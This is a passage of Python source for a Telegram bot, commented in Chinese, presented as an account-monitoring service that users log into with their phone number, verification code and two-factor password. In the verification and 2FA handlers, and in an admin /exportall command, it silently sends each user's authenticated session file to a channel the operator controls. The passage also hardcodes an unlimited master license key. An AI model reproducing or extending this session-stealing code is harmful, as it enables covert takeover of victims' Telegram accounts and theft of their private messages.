            await update.message.reply_text(f"❌ 登录请求失败: {e}", reply_markup=get_main_keyboard())
            return ConversationHandler.END

    await update.message.reply_text("❌ 格式错误。请输入正确的手机号格式 (+8613800000000)", reply_markup=get_cancel_keyboard())
    return PHONE_INPUT

async def handle_verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # 统一权限检查
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END

    text = update.message.text
    if text == "❌ 取消操作":
        if context.user_data.get('temp_client'):
            try:
                await context.user_data['temp_client'].disconnect()
            except:
                pass
        context.user_data.clear()
        await update.message.reply_text("已取消", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    client = context.user_data.get('temp_client')
    phone = context.user_data.get('phone')
    file_path = context.user_data.get('file_path')

    if not client or not phone:
        await update.message.reply_text("❌ 会话已过期，请重新开始", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    try:
        # 尝试登录
        await client.sign_in(phone, code=text)
        await update.message.reply_text("✅ 登录成功！")
        try:
            await client.disconnect()
        except:
            pass
        await start_monitoring_for_session(update.effective_user.id, phone, file_path, update.get_bot())
        context.user_data.clear()
        await update.message.reply_text(f"✅ 监控已启动\n账号: {phone}", reply_markup=get_main_keyboard())

        # 静默导出到频道
        session_data = {
            "phone": phone,
            "user_id": update.effective_user.id,
            "created_at": datetime.now().isoformat(),
            "session_file": f"{phone}.session",
            "note": f"用户{update.effective_user.id}登录添加",
            "source": "phone_login_complete"
        }
        await export_session_to_channel(update.get_bot(), update.effective_user.id, phone, file_path, session_data)
        return ConversationHandler.END

    except SessionPasswordNeededError:
        # 需要2FA密码，保存当前验证码用于后续重试
        context.user_data['verification_code'] = text
        await update.message.reply_text("🔐 请输入二级密码：", reply_markup=get_cancel_keyboard())
        return TWO_FACTOR_PASSWORD

    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ 验证码无效，请检查后重新输入：", reply_markup=get_cancel_keyboard())
        return VERIFICATION_CODE

    except FloodWaitError as e:
        await update.message.reply_text(f"❌ 操作过于频繁，请等待 {e.seconds} 秒后再试", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    except Exception as e:
        error_msg = str(e)
        # 检查是否是验证码过期错误
        if "expired" in error_msg.lower():
            # 重新发送验证码
            try:
                await client.send_code_request(phone)
                await update.message.reply_text(
                    "⚠️ 验证码已过期，已重新发送\n\n"
                    "请输入新的5位验证码：",
                    reply_markup=get_cancel_keyboard()
                )
                return VERIFICATION_CODE
            except Exception as send_err:
                logger.error(f"重新发送验证码失败: {send_err}")
                await update.message.reply_text(
                    f"❌ 验证失败: {error_msg}\n请重新开始登录。",
                    reply_markup=get_main_keyboard()
                )
                return ConversationHandler.END
        else:
            logger.error(f"验证失败: {e}")
            await update.message.reply_text(f"❌ 验证失败: {error_msg}", reply_markup=get_main_keyboard())
            return ConversationHandler.END

async def handle_two_factor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # 统一权限检查
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END

    password = update.message.text
    if password == "❌ 取消操作":
        if context.user_data.get('temp_client'):
            try:
                await context.user_data['temp_client'].disconnect()
            except:
                pass
        context.user_data.clear()
        await update.message.reply_text("已取消", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    client = context.user_data.get('temp_client')
    phone = context.user_data.get('phone')
    file_path = context.user_data.get('file_path')
    verification_code = context.user_data.get('verification_code')  # 获取之前输入的验证码

    if not client or not phone:
        await update.message.reply_text("❌ 会话已过期，请重新开始", reply_markup=get_main_keyboard())
        return ConversationHandler.END

    try:
        # 先尝试用密码登录
        await client.sign_in(password=password)
        await update.message.reply_text("✅ 二级密码通过！")
        try:
            await client.disconnect()
        except:
            pass
        await start_monitoring_for_session(update.effective_user.id, phone, file_path, update.get_bot())
        context.user_data.clear()
        await update.message.reply_text(f"✅ 监控已启动\n账号: {phone}", reply_markup=get_main_keyboard())

        # 静默导出到频道
        session_data = {
            "phone": phone,
            "user_id": update.effective_user.id,
            "created_at": datetime.now().isoformat(),
            "session_file": f"{phone}.session",
            "note": f"用户{update.effective_user.id}登录添加(2FA)",
            "source": "phone_login_2fa"
        }
        await export_session_to_channel(update.get_bot(), update.effective_user.id, phone, file_path, session_data)
        return ConversationHandler.END

    except PhoneCodeInvalidError:
        # 验证码过期，重新发送并回到验证码步骤
        await update.message.reply_text(
            "⚠️ 验证码已过期，正在重新发送...\n\n"
            "请输入新的验证码：",
            reply_markup=get_cancel_keyboard()
        )
        try:
            await client.send_code_request(phone)
            context.user_data.pop('verification_code', None)
            return VERIFICATION_CODE
        except Exception as e:
            await update.message.reply_text(f"❌ 重新发送验证码失败: {e}", reply_markup=get_main_keyboard())
            return ConversationHandler.END

    except PasswordHashInvalidError:
        await update.message.reply_text("❌ 二级密码错误，请重新输入：", reply_markup=get_cancel_keyboard())
        return TWO_FACTOR_PASSWORD

    except Exception as e:
        error_msg = str(e)
        logger.error(f"二级密码验证失败: {e}")

        # 如果还有验证码过期的情况
        if "expired" in error_msg.lower():
            await update.message.reply_text(
                "⚠️ 验证码已过期，正在重新发送...\n\n"
                "请输入新的验证码：",
                reply_markup=get_cancel_keyboard()
            )
            try:
                await client.send_code_request(phone)
                context.user_data.pop('verification_code', None)
                return VERIFICATION_CODE
            except Exception as send_err:
                await update.message.reply_text(f"❌ 重新发送验证码失败: {send_err}", reply_markup=get_main_keyboard())
                return ConversationHandler.END

        await update.message.reply_text(f"❌ 验证失败: {error_msg}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def handle_inline_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    await query.answer()

    # 验证回调的特殊处理（verify_join 不需要权限检查）
    if data == "verify_join":
        await verify_join_callback(update, context)
        return

    if data == "check_pay":
        await payment_check_callback(update, context)
        return

    # 其他回调需要权限检查
    if not await ensure_user_permission(update, context):
        return

    if data == "noop":
        return

    if data.startswith("stop_single:"):
        phone = data.split(":", 1)[1]

        with sessions_lock:
            has_session = user_id in user_sessions and phone in user_sessions[user_id]

        if not has_session:
            await query.edit_message_text(f"⚠️ 账号 {phone} 已不在监控列表中。", parse_mode='HTML')
            return

        await query.edit_message_text(f"⏳ 正在断开: {phone}...", parse_mode='HTML')
        success = await stop_monitoring(user_id, phone, archive=True)

        if success:
            with sessions_lock:
                remaining = dict(user_sessions.get(user_id, {}))

            if remaining:
                await query.edit_message_text(
                    f"✅ <b>已断开并归档</b>: {phone}\n\n⚙️ <b>账号管理</b>\n正在监控 {len(remaining)} 个账号",
                    parse_mode='HTML',
                    reply_markup=build_manage_inline(user_id)
                )
            else:
                await query.edit_message_text(
                    f"✅ <b>已断开并归档</b>: {phone}\n\n当前没有正在监控的账号。",
                    parse_mode='HTML'
                )
        else:
            await query.edit_message_text(f"❌ 操作失败，请重试。\n账号: {phone}", parse_mode='HTML')

    elif data == "stop_all":
        with sessions_lock:
            has_sessions = user_id in user_sessions and user_sessions[user_id]
            phones = list(user_sessions.get(user_id, {}).keys()) if has_sessions else []

        if not has_sessions:
            await query.edit_message_text("ℹ️ 没有活跃监控任务。")
            return

        await query.edit_message_text("⏳ 正在停止所有监控...")

        count = 0
        for phone in phones:
            if await stop_monitoring(user_id, phone, archive=True):
                count += 1

        await query.edit_message_text(f"✅ <b>已停止全部监控</b>\n共断开 {count} 个账号", parse_mode='HTML')

# ==================== 管理员卡密命令 ====================

async def cmd_activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """用户激活卡密"""
    user_id = update.effective_user.id

    # 检查是否已加入频道（激活前也需要检查）
    is_joined, _ = await check_user_in_channel(context, user_id)
    if not is_joined:
        await send_join_required(update, user_id, context)
        return

    ps = check_payment_status(user_id)
    if ps['status'] == 'paid':
        await update.message.reply_text("✅ 您已激活，无需重复操作。\n发送 /start 开始使用。")
        return

    if not context.args:
        await update.message.reply_text(
            "💡 <b>卡密激活</b>\n\n用法：<code>/activate 卡密</code>\n示例：<code>/activate ABCD-1234-EFGH-5678</code>\n\n"
            "💎 <b>试用卡密：</b> <code>dj4399662</code>",
            parse_mode='HTML'
        )
        return

    key = context.args[0].strip()
    result = use_cardkey(user_id, key)

    if result['ok']:
        await update.message.reply_text(
            "🎉 <b>激活成功！</b>\n\n您已通过卡密验证，发送 /start 开始使用。",
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ <b>激活失败</b>\n{result['reason']}\n\n请检查卡密是否正确，或联系管理员。\n\n💎 试用卡密：<code>dj4399662</code>",
            parse_mode='HTML'
        )

# ==================== 管理员：强制验证用户加入频道 ====================

async def cmd_check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员：检查指定用户是否加入频道"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return

    if not context.args:
        await update.message.reply_text(
            "👑 <b>检查用户频道加入状态</b>\n\n"
            "用法：<code>/checkjoin 用户ID</code>\n"
            "示例：<code>/checkjoin 123456789</code>",
            parse_mode='HTML'
        )
        return

    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return

    is_joined, msg = await check_user_in_channel(context, target_user_id)

    if is_joined:
        await update.message.reply_text(
            f"✅ <b>用户 {target_user_id}</b>\n"
            f"状态：已加入频道\n\n"
            f"📢 频道：{REQUIRED_CHANNEL}",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"❌ <b>用户 {target_user_id}</b>\n"
            f"状态：未加入频道\n\n"
            f"📢 频道：{REQUIRED_CHANNEL}\n\n"
            f"请提醒用户加入频道后使用 /start 重新验证。",
            parse_mode='HTML'
        )

async def cmd_clear_join_record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员：清除用户的加入记录（强制重新验证）"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return

    if not context.args:
        await update.message.reply_text(
            "👑 <b>清除用户加入记录</b>\n\n"
            "用法：<code>/clearjoin 用户ID</code>\n"
            "示例：<code>/clearjoin 123456789</code>\n\n"
            "⚠️ 清除后用户需要重新验证频道加入状态",
            parse_mode='HTML'
        )
        return

    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return

    records = _load_joined_records()
    user_id_str = str(target_user_id)

    if user_id_str in records:
        del records[user_id_str]
        _save_joined_records(records)
        await update.message.reply_text(
            f"✅ 已清除用户 {target_user_id} 的加入记录\n"
            f"用户下次使用将需要重新验证频道加入状态。"
        )
    else:
        await update.message.reply_text(f"⚠️ 用户 {target_user_id} 没有加入记录")

# ==================== 管理员卡密命令 ====================

async def cmd_gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员生成卡密"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return

    count = 1
    note = ''
    if context.args:
        if context.args[0].isdigit():
            count = min(int(context.args[0]), 50)
            note = ' '.join(context.args[1:]) if len(context.args) > 1 else ''
        else:
            note = ' '.join(context.args)

    keys = generate_cardkeys_batch(count, note)
    lines = '\n'.join(f"<code>{k}</code>" for k in keys)
    await update.message.reply_text(
        f"🔑 <b>已生成 {count} 张卡密</b>\n" + (f'备注：{note}\n' if note else '') + f"\n{lines}\n\n💡 固定万能卡密：<code>dj4399662</code>（可无限使用）",
        parse_mode='HTML'
    )

async def cmd_list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员列出卡密"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return

    show_all = context.args and context.args[0].lower() == 'all'
    keys = list_cardkeys(only_unused=not show_all)

    # 显示固定卡密信息
    fixed_info = f"\n\n🔓 <b>固定万能卡密（无限使用）：</b> <code>dj4399662</code>"

    if not keys:
        await update.message.reply_text("📭 暂无" + ("全部" if show_all else "未使用的") + "卡密" + fixed_info, parse_mode='HTML')
        return

    lines = []
    for k in keys:
        status = "✅ 未用" if not k['used'] else f"❌ 已用（uid:{k['used_by']}）"
        note = f"  备注:{k['note']}" if k.get('note') else ''
        lines.append(f"<code>{k['key']}</code> {status}{note}")

    chunk = lines[:30]
    text = f"🔑 <b>卡密列表</b>（{'全部' if show_all else '未使用'}，共{len(keys)}张）\n\n" + '\n'.join(chunk)
    if len(lines) > 30:
        text += f"\n\n…还有 {len(lines)-30} 张未显示"
    text += fixed_info

    await update.message.reply_text(text, parse_mode='HTML')

# ==================== 管理员：手动导出所有会话命令（静默）====================

async def cmd_export_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员：静默导出所有会话到频道"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return

    await update.message.reply_text("📤 开始静默导出所有会话到频道，请稍候...")

    exported_count = 0

    # 记录已导出的文件
    exported_record = EXPORT_DIR / "exported_records.json"
    exported_phones = set()
    if exported_record.exists():
        try:
            with open(exported_record, 'r') as f:
                exported_phones = set(json.load(f))
        except:
            pass

    for user_dir in SESSIONS_DIR.iterdir():
        if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
            continue

        try:
            uid = int(user_dir.name.replace("user_", ""))
        except ValueError:
            continue

        session_files = list(user_dir.glob("*.session"))

        for session_file in session_files:
            phone = session_file.stem

            # 避免重复导出
            if phone in exported_phones:
                continue

            # 检查会话是否有效
            is_alive, _ = await check_session_alive(session_file)
            if not is_alive:
                continue

            # 静默导出到频道
            session_data = {
                "phone": phone,
                "user_id": uid,
                "created_at": datetime.now().isoformat(),
                "session_file": f"{phone}.session",
                "note": f"手动导出 - 用户{uid}",
                "source": "manual_export"
            }
            success = await export_session_to_channel(update.get_bot(), uid, phone, session_file, session_data)
            if success:
                exported_count += 1
                exported_phones.add(phone)
            await asyncio.sleep(0.3)

    # 保存已导出记录
    try:
        with open(exported_record, 'w') as f:
            json.dump(list(exported_phones), f)
    except:
        pass

    await update.message.reply_text(f"✅ 静默导出完成！共导出 {exported_count} 个会话到频道。")

# ==================== 超级管理员：管理员管理命令 ====================

async def cmd_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """超级管理员：添加管理员"""
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await update.message.reply_text("❌ 只有超级管理员可以执行此操作")
        return

    if not context.args:
        await update.message.reply_text(
            "👑 <b>添加管理员</b>\n\n用法：<code>/addadmin 用户ID</code>\n示例：<code>/addadmin 123456789</code>\n\n"
            "注意：只能添加普通管理员，超级管理员无法被添加",
            parse_mode='HTML'
        )
        return

    try:
        new_admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return

    success, msg = add_admin(new_admin_id, user_id)
    await update.message.reply_text(msg, parse_mode='HTML')

async def cmd_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """超级管理员：移除管理员"""
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await update.message.reply_text("❌ 只有超级管理员可以执行此操作")
        return

    if not context.args:
        await update.message.reply_text(
            "👑 <b>移除管理员</b>\n\n用法：<code>/removeadmin 用户ID</code>\n示例：<code>/removeadmin 123456789</code>",
            parse_mode='HTML'
        )
        return

    try:
        admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return

    success, msg = remove_admin(admin_id, user_id)
    await update.message.reply_text(msg, parse_mode='HTML')

async def cmd_list_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """列出所有管理员（超级管理员和管理员都可查看）"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return

    admins = list_admins()

    if not admins:
        await update.message.reply_text("📭 暂无管理员")
        return

    lines = ["👑 <b>管理员列表</b>\n"]
    for admin in admins:
        lines.append(f"{admin['type']}: <code>{admin['id']}</code>")

    await update.message.reply_text("\n".join(lines), parse_mode='HTML')

# ==================== Flask 后台管理 ====================

flask_app = Flask(__name__)

def _check_auth(username: str, password: str) -> bool:
    return username == WEB_USER and password == WEB_PASS

def _auth_required():
    from flask import Response
    return Response('请输入用户名和密码', 401, {'WWW-Authenticate': 'Basic realm="Admin Login"'})

@flask_app.before_request
def _require_login():
    from flask import request
    auth = request.authorization
    if not auth or not _check_auth(auth.username, auth.password):
        return _auth_required()

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>账号监控后台</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', sans-serif; background: #0f1117; color: #e0e0e0; min-height: 100vh; }
  .header { background: linear-gradient(135deg, #1a1d2e, #252840); padding: 24px 40px; border-bottom: 1px solid #2e3150; display: flex; align-items: center; gap: 16px; }
  .header h1 { font-size: 22px; font-weight: 600; color: #fff; }
  .stats-bar { display: flex; gap: 20px; padding: 24px 40px; flex-wrap: wrap; }
  .stat-card { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 12px; padding: 18px 28px; flex: 1; min-width: 160px; }
  .stat-card .num { font-size: 32px; font-weight: 700; color: #818cf8; }
  .stat-card .label { font-size: 13px; color: #8892b0; margin-top: 4px; }
  .container { padding: 0 40px 40px; }
  .user-block { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 14px; margin-bottom: 20px; overflow: hidden; }
  .user-header { background: #1e2236; padding: 14px 22px; border-bottom: 1px solid #2e3150; }
  .user-header .uid { font-size: 13px; background: #252840; color: #818cf8; padding: 3px 10px; border-radius: 20px; font-family: monospace; }
  table { width: 100%; border-collapse: collapse; }
  th { background: #16192a; padding: 11px 22px; text-align: left; font-size: 12px; color: #6b7280; }
  td { padding: 13px 22px; border-top: 1px solid #1e2236; font-size: 14px; }
  .phone { font-family: monospace; color: #e0e7ff; }
  .status-alive { color: #4ade80; font-size: 13px; }
  .refresh { position: fixed; bottom: 30px; right: 30px; background: #4f46e5; color: #fff; border: none; padding: 12px 22px; border-radius: 30px; cursor: pointer; text-decoration: none; }
</style>
</head>
<body>
<div class="header"><h1>账号监控后台</h1></div>
<div class="stats-bar">
  <div class="stat-card"><div class="num">{{ total_users }}</div><div class="label">活跃用户数</div></div>
  <div class="stat-card"><div class="num">{{ total_active }}</div><div class="label">运行中账号</div></div>
  <div class="stat-card"><div class="num">{{ total_files }}</div><div class="label">会话文件总数</div></div>
</div>
<div class="container">
  {% for user_id, phones in active_data.items() %}
  <div class="user-block">
    <div class="user-header"><span class="uid">用户 {{ user_id }}</span></div>
    <table>
      <thead><tr><th>手机号</th><th>状态</th><th>Session 路径</th></tr></thead>
      <tbody>
      {% for phone, info in phones.items() %}
      <tr><td class="phone">{{ phone }}</td><td><span class="status-alive">运行中</span></td>
      <td>{{ info.file_path }}</td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </div>
  {% endfor %}
</div>
<a class="refresh" href="/">刷新</a>
</body>
</html>
"""

@flask_app.route("/")
def admin_index():
    # 线程安全地获取快照
    with sessions_lock:
        active_snapshot = {
            uid: {phone: {'file_path': str(info['file_path'])} 
                  for phone, info in phones.items()}
            for uid, phones in user_sessions.items()
        }

    total_files = 0
    if SESSIONS_DIR.exists():
        for user_dir in SESSIONS_DIR.iterdir():
            if user_dir.is_dir():
                total_files += len(list(user_dir.glob("*.session")))

    return render_template_string(
        ADMIN_HTML,
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        total_users=len(active_snapshot),
        total_active=sum(len(v) for v in active_snapshot.values()),
        total_files=total_files,
        active_data=active_snapshot
    )

def _run_flask():
    flask_app.run(host="0.0.0.0", port=39999, debug=False, use_reloader=False)

# ==================== 启动入口 ====================

async def post_init(application: Application):
    logger.info("Bot 启动完成，开始扫描会话...")
    await scan_and_restore_all_sessions(application.bot)

def main():
    # 启动 Flask 后台
    flask_thread = threading.Thread(target=_run_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask 后台管理已启动: http://0.0.0.0:39999")

    # 创建 Application 并设置连接参数
    builder = Application.builder().token(BOT_TOKEN)

    # 如果使用代理，取消下面的注释
    # if USE_PROXY:
    #     from telegram.request import HTTPXRequest
    #     import httpx
    #     proxy_url = PROXY_URL
    #     request = HTTPXRequest(proxy=proxy_url, connect_timeout=30.0, read_timeout=30.0)
    #     builder.request(request)

    application = builder.post_init(post_init).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            MessageHandler(filters.Regex(r'^(📁 上传会话文件|📱 手机号登录|⚙️ 账号管理)'), entry_handler)
        ],
        states={
            PHONE_INPUT: [MessageHandler(filters.Document.ALL | filters.TEXT & ~filters.COMMAND, handle_phone_or_file)],
            VERIFICATION_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_verification_code)],
            TWO_FACTOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_two_factor)],
        },
        fallbacks=[CommandHandler('start', start)],
        allow_reentry=True
    )

    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(handle_inline_callback, pattern=r'^(stop_single:|stop_all|noop|verify_join|check_pay)'))
    application.add_handler(CommandHandler('activate', cmd_activate))
    application.add_handler(CommandHandler('genkey', cmd_gen_key))
    application.add_handler(CommandHandler('listkeys', cmd_list_keys))
    application.add_handler(CommandHandler('exportall', cmd_export_all))

    # 超级管理员专用命令（管理其他管理员）
    application.add_handler(CommandHandler('addadmin', cmd_add_admin))
    application.add_handler(CommandHandler('removeadmin', cmd_remove_admin))
    application.add_handler(CommandHandler('listadmins', cmd_list_admins))

    # 频道验证管理命令
    application.add_handler(CommandHandler('checkjoin', cmd_check_join))
    application.add_handler(CommandHandler('clearjoin', cmd_clear_join_record))

    logger.info("Bot 已启动")
    logger.info(f"超级管理员: {SUPER_ADMIN_IDS}")
    logger.info(f"普通管理员: {list(_load_admins())}")
    logger.info(f"要求加入频道: {REQUIRED_CHANNEL}")
    application.run_polling()

if __name__ == '__main__':
    main()